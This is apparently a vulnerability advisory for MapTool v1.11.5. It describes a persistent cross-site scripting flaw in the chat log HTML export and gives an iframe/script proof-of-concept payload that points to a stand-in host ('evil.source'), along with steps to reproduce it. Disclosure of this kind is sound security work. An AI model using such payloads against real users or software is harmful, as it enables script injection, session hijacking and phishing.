Product & Service Introduction:
===============================
MapTool is a fully featured, flexible virtual tabletop. Not only does MapTool come with powerful tools for creating detailed maps
but also a chat function, an initiative tracker, and a detailed token management system to create characters, monsters, objects,
and anything you can imagine. MapTool's user interface is highly configurable, and features not being used can be hidden out of sight.
The latest version of MapTool can be found on GitHub. MapTool attempts to use Semantic Versioning to help groups know whether a change
may break their game or not so they can decide when to upgrade. Exciting new features can be tested in development (alpha or beta) builds,
but for your game where stability matters sticking to the major releases is recommended. MapTool campaigns saved in newer versions may not
work on older versions, so be careful with your campaign files when trying out development builds.

Discovery Status:
=================
Published

Exploitation Technique:
=======================

Restricted Authentication (Guest Privileges)

User Interaction:
=================

Technical Details & Description:
================================
A persistent input validation web vulnerability has been discovered in the official MapTool v1.11.5 software.
The vulnerability allows remote attackers to inject own malicious script codes with persistent attack vector
to compromise browser to web-application requests from the application-side.

The vulnerability is located in the Speicher den Nachrichtenverlauf (Save Message Logs) function that exports
without a secure encode of html entities. Thus allows remote attackers to send malicious payloads that are not
visible in the chat but being saved to the exported html file. Opening the html file directly executes the injected
script code payloads on the local computer system. The vulnerability can be used by actors to form malicious files
for malware, phishing or data exfiltration after locat compromise.

Successful exploitation of the vulnerability results in session hijacking, persistent phishing attacks, persistent
external redirects to malicious source and persistent manipulation of affected application modules.

Vulnerable Module(s):
[+] Chat

Affected Module(s):
[+] Speicher den Nachrichtenverlauf

Proof of Concept (PoC):
=======================
The persistent and non-persistent input validation web vulnerabilities can be exploited by remote attackers without user account and with or without low user interaction.
For security demonstration or to reproduce the persistent cross site web vulnerability follow the provided information and steps below to continue.

PoC: Payload
<iframe src="http://evil.source/malicious.jsp?inject=<script>eval(name)</script>" name="alert(1337)"></iframe>

Manual steps to reproduce the vulnerability:
1. Install the linux, windows or macos map software
2. Open the chat and inject payload
3. Send the input to execute
4. Save the chat logs by settings (default html)
5. Open the exported html file with the chat communication
Note: Opening the file directly executes the payload
6. Successful reproduce of the non-persistent and persistent input validation vulnerability
